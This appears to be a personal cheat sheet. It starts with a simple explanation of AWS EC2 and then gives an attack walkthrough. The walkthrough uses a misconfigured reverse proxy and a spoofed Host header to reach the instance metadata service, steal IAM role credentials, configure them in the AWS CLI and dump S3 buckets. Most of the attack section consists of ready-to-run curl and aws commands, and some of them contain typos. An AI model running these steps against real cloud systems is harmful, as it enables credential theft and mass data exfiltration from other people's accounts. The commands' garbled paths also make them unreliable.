# What?

Amazon Elastic Compute Cloud (EC2) is like having your very own computer that you can rent and use whenever you need it. Let me explain it to you in simple terms:

Imagine that you have a computer at home that you use for doing your homework, playing games, and watching videos. But sometimes, you need a more powerful computer to do things like run a program that requires a lot of processing power or store a large amount of data.

That’s where EC2 comes in. It allows you to rent a virtual computer, called an instance, from Amazon’s cloud infrastructure. You can choose the size and specifications of the instance you need, just like you would choose a new computer to buy.

Once you rent an instance, you can access it remotely from your own computer and use it just like you would use your own computer. You can install software, store files, and run programs on the instance. When you’re done using it, you can stop the instance and you’ll only pay for the time you used it.

For example, if you’re a video game developer, you might use EC2 to rent a powerful instance that you can use to test your game on different platforms. Or if you’re a data scientist, you might use EC2 to rent an instance that has a lot of memory and processing power to run complex data analysis algorithms.

So, to summarize, EC2 is like having your very own computer that you can rent and use whenever you need it, without having to buy a new computer every time you need more processing power or storage. You can access it remotely and use it just like your own computer, and you only pay for the time you use it.

# Instance Metadata Service (IMDS)

- Metadata: Data about data
- IMDS: Data about your instance that you can use to configure and manage the running instance

## Misconfigured reverse proxy

> **Every has access to it own MDS using curl command**

```bash
curl http://<public-ip-address>/latest -H "Host: 169.254.169.254"
```

### Enumerating IMDS

- IAM: Identity access management
- Instance Credential: Information about roles, assign policies, access key and token key.
- User Data: Commands provide at launch time in userdata field. Example Python or Apache server

Exploit the S3 buckets content using stolen EC2 instance profile.

```bash
# Get metadata
curl http://<public-ip-address>/latest/meta-data -H "Host: 169.254.169.254"
# IAM metadata
curl http://<public-ip-address>/latest/meta-data/iam -H "Host: 169.254.169.254"

# Security credential
curl http://<public-ip-address>/latest/meta-data/security-credentials/ -H "Host: 169.254.169.254"
#### List the role name ####
curl http://<public-ip-address>/latest/meta-data/security-credintials/<rolename> -H "Host: 169.254.169.254"
# We will got the info like AccessKeyId, SecretAccessKey and Token.

# ==========================
# Then we can use aws cli to retrieve more information
aws configure --profile <profile_name> # Put any profile name that you want
# Fill the AccessKeyId, SecretAccessKey. (Leave the empty for all left)

# Add the sesstion token into ~/.aws/credential
# As: aws_sesstion_token = xxxxxxx

# List the s3 bucket
aws s3 ls --profile <profile_name>
```

- Dump S3 bucket

```bash
aws s3 sync s3://<bucket_name> <local_path_to_save> --profile <profile_name>
```

